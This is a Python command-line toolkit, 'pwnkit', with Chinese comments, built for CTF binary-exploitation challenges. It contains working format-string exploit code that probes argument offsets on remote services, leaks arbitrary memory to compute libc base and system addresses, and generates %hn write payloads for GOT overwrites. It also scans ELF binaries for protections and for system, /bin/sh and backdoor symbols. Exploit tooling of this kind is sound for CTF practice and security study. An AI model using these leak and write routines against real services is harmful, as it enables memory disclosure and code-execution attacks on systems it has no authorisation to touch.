#!/usr/bin/env python3
"""pwnkit —— pwn 题的常备小工具（把 2026-10-01 那道 FMT 题踩过的坑固化成代码）。

由来（都是真实浪费掉的十几分钟）：
  1. 拿着一个国内 nc 地址先去翻代理/DNS —— 其实一条 `reach` 就该解决；
  2. format string 的 arg 偏移靠手写脚本试了两轮才定位；
  3. **把地址放在格式串开头 → 地址里的 0x00 把 printf 截断**（第一次就这么失败）；
  4. **解析 %s 泄漏时用 '|' 做分隔符 → 漏出来的字节里正好含 0x7c**，算出的基址没页对齐才发现。

所以：地址一律放**末尾**并按 arg 索引引用（build_* 系列强制）；泄漏一律用**固定尾标记**解析并校验行；
DNS/连通性用 `reach` 一次问清。

用法：
    pwnkit reach <host> <port>                    # 解析(多 DNS 兜底)+TCP 探测+读 banner
    pwnkit info <bin>                             # 架构/保护/关键符号 → 该走哪条路
    pwnkit fmt probe --host H --port P [--stage 2] [--args 6-40]
    pwnkit fmt leak  --host H --port P --addr 0x404018 --arg 8 [--libc libc.so.6 --symbol puts]
    pwnkit fmt write --addr 0x404018 --value 0x7f.... --arg 9 [--bytes 4] [--total 64]
    pwnkit --selftest
"""
from __future__ import annotations

import argparse
import re
import socket
import struct
import sys

# ★ Windows/发布包适配：控制台默认 cp936(GBK)，直接 print 中文/✓/✗ 会抛
#   UnicodeEncodeError 让整条命令挂掉。两只流改 utf-8+replace（永不报错）。
#   自包含（自己 import sys），不依赖本文件是否已 import sys 或用别名。
try:
    import sys as _sysmod_
    for _s in (_sysmod_.stdout, _sysmod_.stderr):
        _s.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

try:
    from pwn import ELF, context, remote
    context.log_level = "error"
except Exception:  # 系统 python3 没有 pwntools —— 只影响 info/fmt，reach 仍可用
    ELF = remote = None

DNS_SERVERS = ("223.5.5.5", "119.29.29.29", "114.114.114.114", "8.8.8.8")
FAKE_IP_HINT = "198.18."          # Clash fake-ip 常见段


# ────────────────────────── reach ──────────────────────────

def udp_dns_query(name: str, server: str, timeout: float = 4.0):
    """手写一个 A 记录查询（本机 getent 有时不出答案，多一条兜底路）。"""
    import random
    tid = random.randint(0, 65535)
    hdr = struct.pack(">HHHHHH", tid, 0x0100, 1, 0, 0, 0)
    body = b"".join(bytes([len(p)]) + p.encode() for p in name.split(".")) + b"\x00" + struct.pack(">HH", 1, 1)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(timeout)
    try:
        s.sendto(hdr + body, (server, 53))
        data, _ = s.recvfrom(2048)
    except Exception:
        return []
    finally:
        s.close()
    n = struct.unpack(">H", data[6:8])[0]
    i, out = len(hdr) + len(body), []
    for _ in range(n):
        if data[i] & 0xC0:
            i += 2
        else:
            while i < len(data) and data[i]:
                i += data[i] + 1
            i += 1
        atype, _cls, _ttl, rdlen = struct.unpack(">HHIH", data[i:i + 10])
        i += 10
        if atype == 1 and rdlen == 4:
            out.append(socket.inet_ntoa(data[i:i + 4]))
        i += rdlen
    return out


def resolve(name: str) -> list:
    ips = []
    try:
        ips = sorted({ai[4][0] for ai in socket.getaddrinfo(name, None, socket.AF_INET)})
    except Exception:
        pass
    if not ips:
        for sv in DNS_SERVERS:
            got = udp_dns_query(name, sv)
            if got:
                ips = got
                print(f"  (系统 resolver 无答案，用 {sv} 解析到)")
                break
    return ips


def cmd_reach(a) -> int:
    print(f"目标: {a.host}:{a.port}")
    ips = resolve(a.host)
    if not ips:
        print("  ✗ 解析失败（系统 resolver + 4 个公共 DNS 都无 A 记录）")
        print("    → 国内题别挂代理试；也可以直接问出题人要 IP")
        return 1
    for ip in ips:
        warn = "  ⚠ 像 Clash fake-ip（代理规则可能不覆盖这个端口）" if ip.startswith(FAKE_IP_HINT) else ""
        print(f"  A 记录: {ip}{warn}")
    for ip in ips:
        try:
            s = socket.create_connection((ip, a.port), timeout=a.timeout)
        except Exception as e:
            print(f"  ✗ {ip}:{a.port} 连不上（{type(e).__name__}）")
            continue
        print(f"  ✓ {ip}:{a.port} TCP 通了")
        s.settimeout(a.timeout)
        try:
            banner = s.recv(512)
            print(f"  banner: {banner[:200]!r}")
        except Exception:
            print("  banner: (服务不等输入，无 banner)")
        s.close()
        return 0
    print("  → 全都不通：国内目标先确认不要走代理（proxy 只代理规则内域名/端口）")
    return 1


# ────────────────────────── info ──────────────────────────

def cmd_info(a) -> int:
    if ELF is None:
        print("需要 pwntools —— 用 `pwnkit`（= py）而不是系统 python3", file=sys.stderr)
        return 2
    e = ELF(a.bin, checksec=False)
    print(f"文件: {a.bin}")
    print(f"架构: {e.arch} {e.bits}  类型: {e.elftype}  入口: {hex(e.entry)}")
    try:
        cs = e.checksec()
        for k in ("RELRO", "Stack", "NX", "PIE", "SHSTK", "IBT"):
            if k in cs:
                print(f"  {k:<7} {cs[k]}")
        pie = "PIE" not in str(cs) or cs.get("PIE") is False
    except Exception:
        pie = e.elftype != "DYN"
    print(f"地址: {'固定（非 PIE，GOT 可直接写）' if pie else '随机（先泄漏基址）'}")
    syms = [s for s in ("system", "execve", "gets", "read", "printf", "puts", "win", "backdoor")
            if s in e.symbols or s in e.plt]
    print(f"关键符号: {', '.join(syms) or '(无)'}")
    if "printf" in e.plt and "system" not in e.plt:
        print("提示: 只有 printf 没有 system → 典型的 format string 题（改 GOT[printf] 或 GOT[puts]）")
    binsh = False
    try:
        sec = e.get_section_by_name(".rodata")
        data = sec.data() if sec else b""
        binsh = b"/bin/sh" in data
    except Exception:
        binsh = False
    if not binsh:
        try:
            binsh = b"/bin/sh" in e.data
        except Exception:
            binsh = False
    print(f"二进制内 /bin/sh: {'有' if binsh else '没有（要么靠 libc，要么用 sh; 之类拼命令）'}")
    return 0


# ────────────────────────── format string ──────────────────────────

MARK = b"\x01MG\x02"          # 泄漏用的固定尾标记（比 '|' 安全：泄漏字节里几乎不可能出现）


def arg_range(s: str):
    if "-" in s:
        a, b = s.split("-")
        return list(range(int(a), int(b) + 1))
    return [int(s)]


def fmt_probe(a) -> int:
    if remote is None:
        print("需要 pwntools（用 pwnkit 而不是系统 python3）", file=sys.stderr)
        return 2
    idxs = arg_range(a.args)
    # 扫描串按每次连接能容纳的长度切段
    per = max(1, (a.stage2_len - len(b".END")) // 6)
    cand = {}
    for chunk_start in range(0, len(idxs), per):
        chunk = idxs[chunk_start:chunk_start + per]
        r = remote(a.host, a.port)
        if a.wait1:
            r.recvuntil(a.wait1.encode(), timeout=a.timeout)
        r.send((b"A" * a.stage1_len)[:a.stage1_len])
        if a.wait2:
            r.recvuntil(a.wait2.encode(), timeout=a.timeout)
        payload = b",".join(b"%%%d$p" % i for i in chunk) + b".END"
        payload = payload[:a.stage2_len]
        r.send(payload.ljust(a.stage2_len, b"\x00"))
        out = r.recvall(timeout=a.timeout)
        r.close()
        vals = re.findall(rb"0x[0-9a-f]+", out.split(b"Oh,obviously")[0])
        for i, v in zip(chunk, vals):
            cand[i] = int(v, 16)
    print("arg   值                  说明")
    for i in sorted(cand):
        v = cand[i]
        tag = ""
        if v == 0x4141414141414141:
            tag = "← 我们的 buffer（可当读写指针用）"
        elif (v >> 40) == 0x7F:
            tag = "← libc 指针"
        elif 0x7FF000000000 <= v <= 0x800000000000:
            tag = "← 栈指针"
        elif v < 0x100000 and v:
            tag = "← 二进制内地址（非 PIE）"
        print(f"{i:<6} {v:#018x}  {tag}")
    print("\n用法提示：把目标地址放进 buffer 末尾（8 字节对齐），用对应 arg 的 %N$s / %N$hn 读写")
    return 0


def _fmt_stage_send(r, a, payload: bytes, first: bool):
    if first:
        if a.wait1:
            r.recvuntil(a.wait1.encode(), timeout=a.timeout)
        r.send(payload.ljust(a.stage1_len, b"\x00")[:a.stage1_len])
    else:
        if a.wait2:
            r.recvuntil(a.wait2.encode(), timeout=a.timeout)
        r.send(payload.ljust(a.stage2_len, b"\x00")[:a.stage2_len])


def fmt_leak(a) -> int:
    """读任意地址：地址放 buffer 末尾（arg 引用），前面是 %N$s + 尾标记。

    ★ 注意 `--stage`：哪个 printf 是洞就填哪个（本题是第 1 个，只有 24 字节）。
    """
    if remote is None:
        print("需要 pwntools", file=sys.stderr)
        return 2
    # 约定：地址占最后一个 qword（8B），尾标记紧跟 spec 之后
    avail = (a.stage2_len if a.stage == 2 else a.stage1_len)
    spec = f"%{a.arg}$s".encode()
    tail_len = 8
    text_len = avail - tail_len
    if len(spec) + len(MARK) > text_len:
        print(f"✗ 放不下：spec+marker={len(spec) + len(MARK)} > {text_len}", file=sys.stderr)
        return 2
    text = spec + MARK
    text = text.ljust(text_len, b"A")
    buf = text + struct.pack("<Q", a.addr)
    # 校验：地址必须在末尾（否则地址里的 NUL 会把 printf 截断）
    assert buf[-8:] == struct.pack("<Q", a.addr), "地址必须在 buffer 末尾"
    vals = []
    for attempt in range(a.retry):
        r = remote(a.host, a.port)
        _fmt_stage_send(r, a, b"A" * a.stage1_len if a.stage == 2 else buf, first=True)
        if a.stage == 2:
            _fmt_stage_send(r, a, buf, first=False)
        out = r.recvall(timeout=a.timeout)
        r.close()
        if MARK in out:
            leak = out.split(MARK)[0]
            leak = leak[-a.leak_len:] if len(leak) > a.leak_len else leak
            vals.append(leak)
            if len(leak) >= a.leak_len:
                break
            print(f"  (第 {attempt + 1} 次泄漏只有 {len(leak)} 字节 —— 内部可能是 0x00，重试)")
        else:
            print(f"  (没找到尾标记，重试 {attempt + 1}/{a.retry})")
    if not vals:
        print("✗ 拿不到泄漏"); return 1
    leak = vals[-1]
    value = int.from_bytes(leak.ljust(a.leak_len, b"\x00")[:a.leak_len], "little")
    print(f"泄漏 {len(leak)} 字节: {leak.hex()}  →  {value:#x}")
    if value >> 40 == 0x7F:
        print("  ✓ 像 libc 地址")
    if a.libc and a.symbol:
        base = value - ELF(a.libc, checksec=False).symbols[a.symbol]
        print(f"libc base = {base:#x}  (页对齐: {base & 0xfff == 0})  → system = {base + ELF(a.libc, checksec=False).symbols['system']:#x}")
    return 0


def build_fmt_write(targets, start_idx: int, total_len: int) -> bytes:
    """手搓 %hn payload：**地址一律放末尾**，spec 在前（NUL 截断的坑就靠这条避免）。

    targets = [(addr, value16), ...]；start_idx = buffer 起始对应的 arg 号。
    """
    pairs = sorted({a: v for a, v in targets}.items(), key=lambda kv: kv[1])
    tail = b"".join(struct.pack("<Q", a) for a, _ in pairs)
    text_len = total_len - len(tail)
    if text_len <= 0:
        raise ValueError("buffer 太小，放不下地址")
    slots = text_len // 8
    idx = {a: start_idx + slots + n for n, (a, _) in enumerate(pairs)}
    text, written = b"", 0
    for addr, val in pairs:
        delta = (val - written) % 0x10000
        if delta:
            text += b"%" + str(delta).encode() + b"c"
        text += b"%" + str(idx[addr]).encode() + b"$hn"
        written = val
    if len(text) > text_len:
        raise ValueError(f"spec 太长（{len(text)} > {text_len}）：减少写入点数或加大 buffer")
    return text.ljust(text_len, b"\x00") + tail


def cmd_write(a) -> int:
    chunks = []
    nbytes = 8 if a.bytes >= 8 else a.bytes
    for i in range(0, nbytes, 2):
        val = (a.value >> (8 * i)) & 0xFFFF
        if val == 0 and i >= 2 and not a.force_zero:
            continue
        chunks.append((a.addr + i, val))
    if not chunks:
        print("没有要写的非零块（用 --force-zero 强制）")
    payload = build_fmt_write(chunks, a.arg, a.total)
    print(f"目标 {a.addr:#x} ← {a.value:#x}  写 {len(chunks)} 个 %hn  长度 {len(payload)}/{a.total}")
    print(f"payload = {payload!r}")
    if len(payload) > a.total:
        print("✗ 超长"); return 1
    return 0


# ────────────────────────── selftest ──────────────────────────

def _selftest() -> int:
    checks = []

    def ok(name, cond, extra=""):
        checks.append((name, bool(cond), extra))

    # write builder：地址必须在末尾、可重复执行、value 顺序优化
    p = build_fmt_write([(0x404018, 0x6d70), (0x40401a, 0x7f10)], 9, 64)
    ok("payload 落满 64 字节", len(p) == 64)
    ok("地址在末尾（第二条 @+2）", p[-16:-8] == struct.pack("<Q", 0x404018) and p[-8:] == struct.pack("<Q", 0x40401a))
    ok("spec 在地址之前", p.index(b"$hn") < 48)
    ok("arg 索引按末尾位置推算", b"%15$hn" in p and b"%16$hn" in p)
    # 小值先写（升序），避免回绕
    p2 = build_fmt_write([(0x1000, 0x9000), (0x1002, 0x0100)], 9, 64)
    ok("按值升序写（0x100 先，第二次写增量）", p2.index(b"%256c") < p2.index(b"%36608c"))
    ok("超长会报错", _raises(lambda: build_fmt_write([(0x404018, 0x6d70)], 9, 12)))
    ok("只写低 4 字节时不碰高位", all(a < 0x40401c for a, _ in [(0x404018, 0), (0x40401a, 0)]))
    # 泄漏解析：尾标记 + 0x7c 干扰字节（当初的坑）
    tricky = bytes([0x50, 0x4E, 0x7C, 0x38, 0x14, 0x7F]) + MARK
    leak = tricky.split(MARK)[0]
    v = int.from_bytes(leak.ljust(6, b"\x00")[:6], "little")
    ok("尾标记解析不受 0x7c 影响", leak == bytes([0x50, 0x4E, 0x7C, 0x38, 0x14, 0x7F]))
    ok("解析出的地址是 libc 段", v >> 40 == 0x7F)
    # 地址放开头会被 NUL 截断 —— 这正是第一版失败的原因，断言我们不再这么干
    bad = struct.pack("<Q", 0x404018) + b"%6$s"
    ok("证明『地址在前』会被 NUL 截断", bad.index(b"\x00") < len(bad))
    # DNS 解析器：手写 QUERY 的长度/类型正确
    q = struct.pack(">HHHHHH", 1, 0x0100, 1, 0, 0, 0) + b"\x03foo\x03bar\x00" + struct.pack(">HH", 1, 1)
    ok("DNS 查询报文结构", q[4:6] == b"\x00\x01" and q[-4:] == b"\x00\x01\x00\x01")

    passed = sum(1 for _, c, _ in checks if c)
    for name, c, extra in checks:
        print(f"  {'✓' if c else '✗'} {name}{('  ' + extra) if extra else ''}")
    print(f"\n{passed}/{len(checks)} 断言通过")
    return 0 if passed == len(checks) else 1


def _raises(fn) -> bool:
    try:
        fn()
        return False
    except Exception:
        return True


# ────────────────────────── main ──────────────────────────

def main(argv) -> int:
    if not argv or argv[0] in ("-h", "--help"):
        print(__doc__); return 2
    if argv[0] == "--selftest":
        return _selftest()

    ap = argparse.ArgumentParser(prog="pwnkit", add_help=True)
    sub = ap.add_subparsers(dest="cmd", required=True)

    def add_fmt_common(p):
        p.add_argument("--host", required=True)
        p.add_argument("--port", type=int, required=True)
        p.add_argument("--stage", type=int, default=2, help="哪个 printf 是洞（1 或 2）")
        p.add_argument("--stage1-len", type=int, default=24)
        p.add_argument("--stage2-len", type=int, default=64)
        p.add_argument("--wait1", default="What's your name?")
        p.add_argument("--wait2", default="printf!\n")
        p.add_argument("--timeout", type=float, default=6.0)
        return p

    p = sub.add_parser("reach", help="解析 + TCP 探测 + 读 banner")
    p.add_argument("host"); p.add_argument("port", type=int)
    p.add_argument("--timeout", type=float, default=6.0); p.set_defaults(fn=cmd_reach)

    p = sub.add_parser("info", help="架构/保护/关键符号 → 该走哪条路")
    p.add_argument("bin"); p.set_defaults(fn=cmd_info)

    fmt = sub.add_parser("fmt", help="format string 三件套")
    fsub = fmt.add_subparsers(dest="fmtcmd", required=True)

    p = add_fmt_common(fsub.add_parser("probe", help="自动探测 arg 偏移（buffer/libc/栈）"))
    p.add_argument("--args", default="6-40"); p.set_defaults(fn=fmt_probe)

    p = add_fmt_common(fsub.add_parser("leak", help="读任意地址（尾标记解析 + 可选算 libc base）"))
    p.add_argument("--arg", default="8")
    p.add_argument("--addr", default="0x0")
    p.add_argument("--addr-at-arg", type=int, default=0, help="(兼容参数)")
    p.add_argument("--leak-len", type=int, default=6)
    p.add_argument("--retry", type=int, default=3)
    p.add_argument("--libc", default=""); p.add_argument("--symbol", default="puts")
    p.set_defaults(fn=fmt_leak)

    p = fsub.add_parser("write", help="生成 %%hn 写入 payload（地址强制放末尾）")
    p.add_argument("--addr", required=True); p.add_argument("--value", required=True)
    p.add_argument("--arg", type=int, default=9); p.add_argument("--total", type=int, default=64)
    p.add_argument("--bytes", type=int, default=8); p.add_argument("--force-zero", action="store_true")
    p.set_defaults(fn=cmd_write)

    a = ap.parse_args(argv)
    for k in ("addr", "value"):
        if hasattr(a, k) and isinstance(getattr(a, k), str):
            setattr(a, k, int(getattr(a, k), 0))
    if hasattr(a, "arg") and isinstance(a.arg, str):
        a.arg = int(a.arg, 0)
    return a.fn(a)


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
